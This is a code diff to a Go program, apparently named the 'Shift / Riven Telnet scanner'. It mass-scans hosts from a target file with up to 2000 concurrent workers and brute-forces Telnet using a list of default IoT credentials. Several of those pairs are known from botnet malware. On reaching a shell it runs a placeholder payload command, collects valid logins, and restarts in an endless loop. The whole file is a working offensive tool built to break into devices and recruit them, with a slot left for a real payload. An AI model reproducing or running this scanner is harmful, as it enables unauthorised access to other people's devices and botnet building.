@@ -2,174 +2,329 @@ package main
 
 import (
 	"bufio"
+	"bytes"
 	"fmt"
-	"math/rand"
 	"net"
 	"os"
-	"strings"
+	"runtime"
 	"sync"
 	"sync/atomic"
 	"time"
 )
 
-type Scanner struct {
-	queueSize  int64
-	hostQueue  chan string
-	validCount int64
-	invalidCount int64
+var CREDENTIALS = []struct {
+	Username string
+	Password string
+}{
+	{"root", "root"},
+	{"root", ""},
+	{"root", "icatch99"},
+	{"admin", "admin"},
+	{"user", "user"},
+	{"admin", "VnT3ch@dm1n"},
+	{"telnet", "telnet"},
+	{"root", "86981198"},
+	{"admin", "password"},
+	{"admin", ""},
+	{"guest", "guest"},
+	{"admin", "1234"},
+	{"root", "1234"},
+	{"pi", "raspberry"},
+	{"support", "support"},
+	{"ubnt", "ubnt"},
+	{"admin", "123456"},
+	{"root", "toor"},
+	{"admin", "admin123"},
+	{"service", "service"},
+	{"tech", "tech"},
+	{"cisco", "cisco"},
+	{"user", "password"},
+	{"root", "password"},
+	{"root", "admin"},
+	{"admin", "admin1"},
+	{"root", "123456"},
+	{"root", "pass"},
+	{"admin", "pass"},
+	{"administrator", "password"},
+	{"administrator", "admin"},
+	{"root", "default"},
+	{"admin", "default"},
+	{"root", "vizxv"},
+	{"admin", "vizxv"},
+	{"root", "xc3511"},
+	{"admin", "xc3511"},
+	{"root", "admin1234"},
+	{"admin", "admin1234"},
+	{"root", "anko"},
+	{"admin", "anko"},
+	{"admin", "system"},
+	{"root", "system"},
 }
 
-var (
-	stdinDone = make(chan bool)
-	CREDENTIALS = []struct {
-		Username string
-		Password string
-	}{
-		{"root", "root"},
-		{"root", ""},
-		{"admin", "admin"},
-		{"user", "user"},
-		{"root", "12345"},
-		{"admin", "1234"},
-		{"admin", "password"},
-	}
+const (
+	TELNET_TIMEOUT  = 2 * time.Second
+	MAX_WORKERS     = 2000
+	PAYLOAD         = "echo PAYLOAD_WORKING"
+	STATS_INTERVAL  = 1 * time.Second
+	MAX_QUEUE_SIZE  = 100000
+	CONNECT_TIMEOUT = 1 * time.Second
 )
 
-func loadPrefixes(filename string) []string {
-	file, err := os.Open(filename)
+type CredentialResult struct {
+	Host     string
+	Username string
+	Password string
+	Output   string
+}
+
+type TelnetScanner struct {
+	lock             sync.Mutex
+	scanned          int64
+	valid            int64
+	invalid          int64
+	foundCredentials []CredentialResult
+	hostQueue        chan string
+	done             chan bool
+	wg               sync.WaitGroup
+	queueSize        int64
+}
+
+func NewTelnetScanner() *TelnetScanner {
+	runtime.GOMAXPROCS(runtime.NumCPU())
+
+	return &TelnetScanner{
+		hostQueue:        make(chan string, MAX_QUEUE_SIZE),
+		done:             make(chan bool),
+		foundCredentials: make([]CredentialResult, 0),
+	}
+}
+
+func (s *TelnetScanner) tryLogin(host, username, password string) (bool, interface{}) {
+	dialer := &net.Dialer{Timeout: CONNECT_TIMEOUT}
+	conn, err := dialer.Dial("tcp", host+":23")
 	if err != nil {
-		fmt.Printf("[ERROR] Failed to open prefix file: %s\n", err)
-		return nil
-	}
-	defer file.Close()
-
-	var prefixes []string
-	scanner := bufio.NewScanner(file)
-	for scanner.Scan() {
-		line := strings.TrimSpace(scanner.Text())
-		if len(line) > 0 && !strings.HasPrefix(line, "#") {
-			prefixes = append(prefixes, line)
-		}
-	}
-	if err := scanner.Err(); err != nil {
-		fmt.Printf("[ERROR] Failed to read prefix file: %s\n", err)
-	}
-	return prefixes
-}
-
-func generateRandomIP(prefixes []string) string {
-	if len(prefixes) == 0 {
-		return ""
-	}
-	prefix := prefixes[rand.Intn(len(prefixes))]
-	parts := strings.Split(prefix, ".")
-	if len(parts) != 2 {
-		return ""
-	}
-	return fmt.Sprintf("%s.%s.%d.%d", parts[0], parts[1], rand.Intn(256), rand.Intn(256))
-}
-
-func (s *Scanner) startWorkers(workers int, wg *sync.WaitGroup) {
-	for i := 0; i < workers; i++ {
-		wg.Add(1)
-		go func(id int) {
-			defer wg.Done()
-			for ip := range s.hostQueue {
-				s.scanHost(ip)
-				atomic.AddInt64(&s.queueSize, -1)
-			}
-		}(i)
-	}
-}
-
-func (s *Scanner) scanHost(ip string) {
-	conn, err := net.DialTimeout("tcp", ip+":23", 5*time.Second)
-	if err != nil {
-		return
+		return false, "connection failed"
 	}
 	defer conn.Close()
 
-	conn.SetReadDeadline(time.Now().Add(5 * time.Second))
+	err = conn.SetDeadline(time.Now().Add(TELNET_TIMEOUT))
+	if err != nil {
+		return false, "deadline error"
+	}
 
-	for _, cred := range CREDENTIALS {
-		// Simulasi login Telnet
-		conn.Write([]byte(cred.Username + "\n"))
-		time.Sleep(500 * time.Millisecond)
-		conn.Write([]byte(cred.Password + "\n"))
+	promptCheck := func(data []byte, prompts ...[]byte) bool {
+		for _, prompt := range prompts {
+			if bytes.Contains(data, prompt) {
+				return true
+			}
+		}
+		return false
+	}
 
-		buf := make([]byte, 1024)
-		n, _ := conn.Read(buf)
-		out := string(buf[:n])
-		if strings.Contains(out, "#") || strings.Contains(out, "$") {
-			fmt.Printf("[VALID] %s:%s:%s\n", ip, cred.Username, cred.Password)
-			atomic.AddInt64(&s.validCount, 1)
-			return
+	data := make([]byte, 0, 1024)
+	buf := make([]byte, 1024)
+	loginPrompts := [][]byte{[]byte("login:"), []byte("Login:"), []byte("username:"), []byte("Username:")}
+
+	startTime := time.Now()
+	for !promptCheck(data, loginPrompts...) {
+		if time.Since(startTime) > TELNET_TIMEOUT {
+			return false, "login prompt timeout"
+		}
+		conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
+		n, err := conn.Read(buf)
+		if err != nil || n == 0 {
+			conn.Write([]byte("\n"))
+			continue
+		}
+		data = append(data, buf[:n]...)
+	}
+
+	_, err = conn.Write([]byte(username + "\n"))
+	if err != nil {
+		return false, "write username failed"
+	}
+
+	data = data[:0]
+	passwordPrompts := [][]byte{[]byte("Password:"), []byte("password:")}
+	startTime = time.Now()
+	for !promptCheck(data, passwordPrompts...) {
+		if time.Since(startTime) > TELNET_TIMEOUT {
+			return false, "password prompt timeout"
+		}
+		conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
+		n, err := conn.Read(buf)
+		if err != nil || n == 0 {
+			continue
+		}
+		data = append(data, buf[:n]...)
+	}
+
+	_, err = conn.Write([]byte(password + "\n"))
+	if err != nil {
+		return false, "write password failed"
+	}
+
+	data = data[:0]
+	shellPrompts := [][]byte{[]byte("$ "), []byte("# "), []byte("> "), []byte("sh-"), []byte("bash-")}
+
+	startTime = time.Now()
+	for time.Since(startTime) < TELNET_TIMEOUT {
+		conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
+		n, err := conn.Read(buf)
+		if err != nil || n == 0 {
+			conn.Write([]byte("\n"))
+			continue
+		}
+		data = append(data, buf[:n]...)
+		if promptCheck(data, shellPrompts...) {
+			conn.SetWriteDeadline(time.Now().Add(TELNET_TIMEOUT))
+			_, err = conn.Write([]byte(PAYLOAD + "\n"))
+			if err != nil {
+				return false, "write command failed"
+			}
+			output := s.readCommandOutput(conn)
+			return true, CredentialResult{host, username, password, output}
 		}
 	}
-	atomic.AddInt64(&s.invalidCount, 1)
+	return false, "no shell prompt"
+}
+
+func (s *TelnetScanner) readCommandOutput(conn net.Conn) string {
+	data := make([]byte, 0, 1024)
+	buf := make([]byte, 1024)
+	startTime := time.Now()
+	readTimeout := TELNET_TIMEOUT / 2
+
+	for time.Since(startTime) < readTimeout {
+		conn.SetReadDeadline(time.Now().Add(300 * time.Millisecond))
+		n, err := conn.Read(buf)
+		if err != nil || n == 0 {
+			if bytes.Contains(data, []byte(PAYLOAD)) {
+				break
+			}
+			continue
+		}
+		data = append(data, buf[:n]...)
+		if bytes.Contains(data, []byte(PAYLOAD)) {
+			break
+		}
+	}
+	if len(data) > 0 {
+		return string(data)
+	}
+	return ""
+}
+
+func (s *TelnetScanner) worker() {
+	defer s.wg.Done()
+	for host := range s.hostQueue {
+		atomic.AddInt64(&s.queueSize, -1)
+		if host == "" {
+			continue
+		}
+		found := false
+		for _, cred := range CREDENTIALS {
+			success, result := s.tryLogin(host, cred.Username, cred.Password)
+			if success {
+				atomic.AddInt64(&s.valid, 1)
+				credResult := result.(CredentialResult)
+				s.lock.Lock()
+				s.foundCredentials = append(s.foundCredentials, credResult)
+				s.lock.Unlock()
+				fmt.Printf("\n[+] Found: %s | %s:%s\n", credResult.Host, credResult.Username, credResult.Password)
+				fmt.Printf("[*] Output: %s\n\n", credResult.Output)
+				found = true
+				break
+			}
+		}
+		if !found {
+			atomic.AddInt64(&s.invalid, 1)
+		}
+		atomic.AddInt64(&s.scanned, 1)
+	}
+}
+
+func (s *TelnetScanner) statsThread() {
+	ticker := time.NewTicker(STATS_INTERVAL)
+	defer ticker.Stop()
+	for {
+		select {
+		case <-s.done:
+			return
+		case <-ticker.C:
+			scanned := atomic.LoadInt64(&s.scanned)
+			valid := atomic.LoadInt64(&s.valid)
+			invalid := atomic.LoadInt64(&s.invalid)
+			queueSize := atomic.LoadInt64(&s.queueSize)
+			memStats := runtime.MemStats{}
+			runtime.ReadMemStats(&memStats)
+			fmt.Printf("\rtotal: %d | valid: %d | invalid: %d | queue: %d | routines: %d\n",
+				scanned, valid, invalid, queueSize, runtime.NumGoroutine())
+		}
+	}
+}
+
+func (s *TelnetScanner) Run(hostFile string) {
+	fmt.Printf("Initializing scanner (%d / %d)...\n\n\n", MAX_WORKERS, MAX_QUEUE_SIZE)
+	go s.statsThread()
+
+	file, err := os.Open(hostFile)
+	if err != nil {
+		fmt.Printf("Failed to open host file: %s\n", err)
+		return
+	}
+	defer file.Close()
+
+	scanner := bufio.NewScanner(file)
+	hostCount := 0
+	for scanner.Scan() {
+		host := scanner.Text()
+		if host != "" {
+			atomic.AddInt64(&s.queueSize, 1)
+			select {
+			case s.hostQueue <- host:
+			default:
+				time.Sleep(10 * time.Millisecond)
+				s.hostQueue <- host
+			}
+			hostCount++
+		}
+	}
+	fmt.Printf("Finished reading input: %d hosts queued\n", hostCount)
+
+	for i := 0; i < MAX_WORKERS; i++ {
+		s.wg.Add(1)
+		go s.worker()
+	}
+
+	s.wg.Wait()
+	s.done <- true
+
+	scanned := atomic.LoadInt64(&s.scanned)
+	valid := atomic.LoadInt64(&s.valid)
+	invalid := atomic.LoadInt64(&s.invalid)
+
+	fmt.Println("\n\nScan complete!")
+	fmt.Printf("Total scanned: %d\n", scanned)
+	fmt.Printf("Valid logins found: %d\n", valid)
+	fmt.Printf("Invalid attempts: %d\n", invalid)
+
+	if len(s.foundCredentials) > 0 {
+		fmt.Println("\nFound credentials:")
+		for _, cred := range s.foundCredentials {
+			fmt.Printf("%s - %s:%s\n", cred.Host, cred.Username, cred.Password)
+		}
+	}
 }
 
 func main() {
-	rand.Seed(time.Now().UnixNano())
-	s := &Scanner{
-		hostQueue: make(chan string, 4096),
-	}
-
-	numThreads := 256
-	var wg sync.WaitGroup
-
-	fmt.Println("Shift / Riven Telnet scanner")
-	fmt.Printf("Total CPU cores: %d\n", numThreads)
-
-	s.startWorkers(numThreads, &wg)
+	fmt.Println("\n\n\nShift / Riven Telnet scanner")
+	fmt.Printf("Total CPU cores: %d\n", runtime.NumCPU())
 
 	for {
-		prefixes := loadPrefixes("prefix.txt")
-		if len(prefixes) == 0 {
-			fmt.Println("[!] No prefixes loaded, waiting 10 seconds...")
-			time.Sleep(10 * time.Second)
-			continue
-		}
-
-		go func() {
-			hostCount := 0
-			for i := 0; i < 10000; i++ {
-				ip := generateRandomIP(prefixes)
-				if ip == "" {
-					continue
-				}
-				ip = strings.TrimSpace(ip)
-				if ip == "" || strings.HasPrefix(ip, "#") {
-					continue
-				}
-				atomic.AddInt64(&s.queueSize, 1)
-				hostCount++
-
-				select {
-				case s.hostQueue <- ip:
-				default:
-					time.Sleep(10 * time.Millisecond)
-					s.hostQueue <- ip
-				}
-			}
-			fmt.Printf("Finished reading input: %d hosts queued\n", hostCount)
-			stdinDone <- true
-		}()
-
-		<-stdinDone
-
-		for {
-			if atomic.LoadInt64(&s.queueSize) == 0 {
-				break
-			}
-			time.Sleep(2 * time.Second)
-		}
-
-		fmt.Println("\nScan complete!")
-		fmt.Printf("Total scanned: %d\n", s.validCount + s.invalidCount)
-		fmt.Printf("Valid logins found: %d\n", s.validCount)
-		fmt.Printf("Invalid attempts: %d\n", s.invalidCount)
-		fmt.Println("[!] Scanner cycle completed, restarting in 3 seconds...\n")
-		time.Sleep(3 * time.Second)
+		scanner := NewTelnetScanner()
+		scanner.Run("targets.txt")
+		fmt.Println("Restarting scan in 5 seconds...\n")
+		time.Sleep(5 * time.Second)
 	}
 }
